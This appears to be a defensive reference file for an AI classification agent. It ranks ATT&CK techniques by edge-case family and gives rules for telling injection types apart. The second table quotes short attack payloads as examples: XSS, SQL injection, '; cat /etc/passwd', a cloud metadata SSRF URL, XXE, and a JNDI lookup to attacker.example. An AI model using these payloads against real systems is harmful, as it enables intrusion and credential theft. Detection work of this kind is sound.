# Layer 1 Edge-Case Matrix

Filtered for Agent B: scoped runtime edge cases only.
This file is context only and does not provide runtime risk scores.

| rank | attack_id | attack_vector | edge_case | edge_case_flags | prediction_context |
| --- | --- | --- | --- | --- | --- |
| 1 | T1657 | Financial Theft | Destructive / Ransomware | Destructive / Ransomware | Destructive / Ransomware; Watch: Command; Process; File; Logon Session; Application Log |
| 2 | T1071.001 | Web Protocols | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Command; Network Traffic; Process |
| 3 | T1567.002 | Exfiltration to Cloud Storage | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Command; Network Traffic; Process; File |
| 4 | T1114.002 | Remote Email Collection | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Command; Logon Session; Network Traffic; Application Log |
| 5 | T1185 | Browser Session Hijacking | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Process; User Account; Network Traffic; Module; Logon Session |
| 6 | T1567 | Exfiltration Over Web Service | Destructive / Ransomware | Destructive / Ransomware | Destructive / Ransomware; Watch: Command; Network Traffic; Process; File; Application Log |
| 7 | T1213.006 | Databases | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Network Traffic; Process; File; Cloud Storage; Cloud Service; Application Log |
| 8 | T1213 | Data from Information Repositories | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Command; Process; Network Traffic; Cloud Service; Cloud Storage; File; Application Log; Network Share |
| 9 | T1567.001 | Exfiltration to Code Repository | Destructive / Ransomware | Destructive / Ransomware | Destructive / Ransomware; Watch: Command; Network Traffic; Process; File |
| 10 | T1491.002 | External Defacement | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Network Traffic; Process; File; Cloud Storage; Logon Session |
| 11 | T1567.004 | Exfiltration Over Webhook | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Command; Network Traffic; Process; File; Application Log |
| 12 | T1499.003 | Application Exhaustion Flood | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Network Traffic; Process; Sensor Health; Cloud Service; Application Log |
| 13 | T1499.002 | Service Exhaustion Flood | Destructive / Ransomware | Destructive / Ransomware | Destructive / Ransomware; Watch: Process; Network Traffic; Firewall; Sensor Health; Application Log |
| 14 | T1491 | Defacement | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Network Traffic; Process; File; Cloud Storage; Application Log |
| 15 | T1505.003 | Web Shell | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Network Traffic; Process; File; Logon Session |
| 16 | T1539 | Steal Web Session Cookie | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Process; File; Logon Session; User Account; Application Log |
| 17 | T1114.001 | Local Email Collection | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Process; File; Network Traffic |
| 18 | T1071 | Application Layer Protocol | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Command; Network Traffic; Process |
| 19 | T1056.004 | Credential API Hooking | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Process; Module; File |
| 20 | T1530 | Data from Cloud Storage | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Network Traffic; User Account; Cloud Storage |
| 21 | T1213.002 | Sharepoint | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Logon Session; Cloud Service; Application Log |
| 22 | T1213.003 | Code Repositories | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Logon Session; Cloud Service; Application Log |
| 23 | T1213.005 | Messaging Applications | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Logon Session; Application Log |
| 24 | T1056.003 | Web Portal Capture | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Network Traffic; File |
| 25 | T1213.001 | Confluence | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Network Traffic; Logon Session; Application Log |
| 26 | T1667 | Email Bombing | Destructive / Ransomware | Destructive / Ransomware | Destructive / Ransomware; Watch: File; Application Log |
| 27 | T1496.003 | SMS Pumping | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: User Account; Application Log |
| 28 | T1213.004 | Customer Relationship Management Software | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Logon Session; Application Log |
| 29 | T1528 | Steal Application Access Token | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Cloud Service; Cloud Storage; File; User Account; Application Log |
| 30 | T1564.008 | Email Hiding Rules | Living-off-the-Land | Living-off-the-Land | Living-off-the-Land; Watch: Command; Process; File; Application Log |
| 31 | T1606.001 | Web Cookies | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Web Credential; Network Traffic; File; Logon Session |
| 32 | T1606 | Forge Web Credentials | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Process; Network Traffic; Web Credential; File; Logon Session |
| 33 | T1563 | Remote Service Session Hijacking | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Command; Network Traffic; Process; Logon Session |
| 34 | T1114 | Email Collection | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Command; Process; Network Traffic; File; Logon Session; Application Log; Network Share |
| 35 | T1114.003 | Email Forwarding Rule | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Command; Process; File; Cloud Service; Application Log |
| 36 | T1659 | Content Injection | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Command; Process; File; Network Traffic |
| 37 | T1552.005 | Cloud Instance Metadata API | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Network Traffic; Cloud Service |
| 38 | T1550.001 | Application Access Token | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Web Credential; User Account |
| 39 | T1134.003 | Make and Impersonate Token | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Process; Logon Session |
| 40 | T1098.002 | Additional Email Delegate Permissions | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Process; User Account; Application Log |
| 41 | T1550.004 | Web Session Cookie | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Web Credential; Logon Session; User Account |
| 42 | T1095 | Non-Application Layer Protocol | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion; Watch: Network Traffic |
| 43 | T1190 | Exploit Public-Facing Application | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Network Traffic; Process; Module; Application Log |
| 44 | T1102 | Web Service | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion; Watch: Network Traffic |
| 45 | T1566.002 | Spearphishing Link | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Network Traffic; Process; Application Log |
| 46 | T1217 | Browser Information Discovery | Insider / Trusted Access | Insider / Trusted Access | Insider / Trusted Access; Watch: Command; Process; File |
| 47 | T1087.003 | Email Account | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Command; Process; User Account; Application Log |
| 48 | T1566 | Phishing | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Process; File; Logon Session; Application Log |
| 49 | T1221 | Template Injection | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Process; Network Traffic |
| 50 | T1059.009 | Cloud API | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Command; User Account; Cloud Service |
| 51 | T1505.001 | SQL Stored Procedures | Living-off-the-Land | Living-off-the-Land | Living-off-the-Land; Watch: Process; Script; Module |
| 52 | T1036.012 | Browser Fingerprint | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion; Watch: Network Traffic; Process |
| 53 | T1566.001 | Spearphishing Attachment | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Process; Network Traffic; File; Application Log |
| 54 | T1134.001 | Token Impersonation/Theft | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Process |
| 55 | T1553.005 | Mark-of-the-Web Bypass | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion; Watch: File |
| 56 | T1566.003 | Spearphishing via Service | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Network Traffic; Process; File; Application Log |
| 57 | T1674 | Input Injection | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit | Zero-Day / Unknown Exploit; Watch: Drive; Process; Command; Script |
| 58 | T1027.007 | Dynamic API Resolution | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion; Watch: Process; Module |
| 59 | T1619 | Cloud Storage Object Discovery | API / SaaS Blast Radius | API / SaaS Blast Radius | API / SaaS Blast Radius; Watch: Cloud Storage |
| 60 | T1566.004 | Spearphishing Voice | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse; Watch: Application Log |
| 61 | T1684.002 | Email Spoofing | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion; Watch: Application Log |
| 62 | T1599.001 | Network Address Translation Traversal | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion; Watch: Network Traffic |
| 63 | T1437.001 | Web Protocols | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion |
| 64 | T1660 | Phishing | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion |
| 65 | T1516 | Input Injection | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion |
| 66 | T1437 | Application Layer Protocol | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion |
| 67 | T1481 | Web Service | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion |
| 68 | T1635 | Steal Application Access Token | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse |

## Injection Type Disambiguation Edge Cases

These edge cases address common misclassification between injection families. When the telemetry matches one of these patterns, use the correct classification column.

| # | Observed Pattern | Correct Classification | Common Mistake | Resolution Rule |
| --- | --- | --- | --- | --- |
| E1 | `<script>alert(1)</script>` in URL parameter or POST body | XSS: CAPEC-591 (reflected) / T1059.007 | Misclassified as SQLi (CAPEC-66) | HTML/JS tags target browser rendering, not SQL engine. No SQL keywords present → XSS. |
| E2 | `<img src=x onerror=alert(1)>` in form field | XSS: CAPEC-591 / T1059.007 | Misclassified as SQLi (CAPEC-66) | HTML event handler targets browser DOM. No SQL keywords → XSS. |
| E3 | `{{7*7}}` or `${7*7}` in request body or URL parameter | SSTI: CAPEC-101 closest CAPEC / T1221 primary | Misclassified as XSS (CAPEC-588) | Template expressions sent to server target template engine, not browser. Default to SSTI unless client-side Angular/Vue is confirmed. |
| E4 | `' OR 1=1--` in login form or API parameter | SQLi: CAPEC-66 / T1190 | Misclassified as generic injection | SQL boolean operator + comment marker = SQL injection. |
| E5 | `' UNION SELECT NULL,NULL--` in search parameter | SQLi: CAPEC-7 (blind) or CAPEC-66 / T1190 | Misclassified as XSS or generic | UNION SELECT is SQL-specific syntax. |
| E6 | `; cat /etc/passwd` or `| whoami` in input field | CMDi: CAPEC-88 / T1059 | Misclassified as SQLi (semicolon `;` is also SQL separator) | After `;` or `|`, check if next token is OS command (cat, whoami, id, ls) → CMDi. If SQL keyword (SELECT, DROP) → SQLi. |
| E7 | `../../../etc/passwd` in file path parameter | Path Traversal: CAPEC-126 / T1083 | Misclassified as CMDi (contains `/etc/passwd`) | `../` traversal sequences without command execution syntax → Path Traversal, not CMDi. |
| E8 | `http://169.254.169.254/latest/meta-data` in URL parameter | SSRF: CAPEC-664 / T1190 | Misclassified as generic web attack | URL points to internal cloud metadata endpoint → SSRF. |
| E9 | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in XML body | XXE: CAPEC-201 / T1190 | Misclassified as Path Traversal (contains `/etc/passwd`) | XML DOCTYPE + ENTITY declaration = XXE. The `/etc/passwd` is the entity target, not a traversal path. |
| E10 | `*)(uid=*))(|(uid=*` in LDAP search/auth field | LDAP Injection: CAPEC-136 / T1190 | Misclassified as SQLi (parentheses + wildcards look SQL-like) | LDAP filter syntax characters `)(`, `*`, `\|` in auth/directory context → LDAP Injection. |
| E11 | `<script>` + `UNION SELECT` in SAME parameter | XSS primary: CAPEC-63 / T1059.007 | Misclassified as SQLi only | Classify by OUTER wrapper. HTML tags wrapping SQL = XSS payload that happens to contain SQL text. |
| E12 | `' OR 1=1--` in param A + `<script>` in param B | Report the one that triggered WAF/error as primary | Merged into single wrong classification | Two separate injection attempts in different parameters. Classify each by its own payload content. Report the higher-impact one as primary finding. |
| E13 | WAF rule name says "SQL Injection" but payload is `<script>alert(1)</script>` | XSS: CAPEC-591 / T1059.007 | Trust WAF label blindly → output SQLi | WAF rules can have generic names. Always verify the actual payload content. Payload has HTML/JS, no SQL → XSS. |
| E14 | Template error (Jinja2/Twig) in response after `{{config}}` in input | SSTI: CAPEC-101 closest CAPEC / T1221 primary | Misclassified as application error / no threat | Template engine error confirms server processed the template expression. CAPEC-101 is SSI by official name, but is used here as the closest available CAPEC for SSTI; T1221 is the primary identifier. |
| E15 | `{"username":{"$ne":null},"password":{"$ne":null}}` or `{"$gt":""}` in login/search JSON | NoSQL Injection: CAPEC-676 / T1190 | Misclassified as SQLi because it is query injection | JSON/document query operators (`$ne`, `$gt`, `$where`, `$regex`) target NoSQL query logic, not SQL syntax. |
| E16 | `${jndi:ldap://attacker.example/a}` in User-Agent or form field | Log4Shell/JNDI lookup: T1190, empty CAPEC when no supported CAPEC fits | Misclassified as SSTI due to `${...}` or LDAP Injection due to `ldap://` | JNDI lookup exploitation is not template rendering and not LDAP filter manipulation. Map technique to T1190 and keep CAPEC empty unless a supported local CAPEC is explicitly required. |
| E17 | `' or '1'='1` in XPath-backed XML search field or `count(//user)` in XML query parameter | XPath/XQuery Injection: CAPEC-83/84 / T1190 | Misclassified as SQLi or XXE | XML query context plus XPath/XQuery functions/path selectors means XPath/XQuery Injection. XXE requires DOCTYPE/ENTITY behavior. |
| E18 | `%0d%0aSet-Cookie:%20admin=true` in redirect/header parameter | CRLF / HTTP Header Injection: CAPEC-105 / T1190 | Misclassified as generic URL encoding or XSS | Decode `%0d%0a`; if it creates a new HTTP header or response line, classify as CRLF/Header Injection. |
| E19 | `%3Cscript%3Ealert(1)%3C/script%3E` or `%27%20OR%201%3D1--` in request input | Decode then classify to original family: XSS or SQLi | Missed as harmless encoding / generic injection | Inspect safely decoded payloads before selecting CAPEC. Encoded XSS remains XSS; encoded SQLi remains SQLi. |
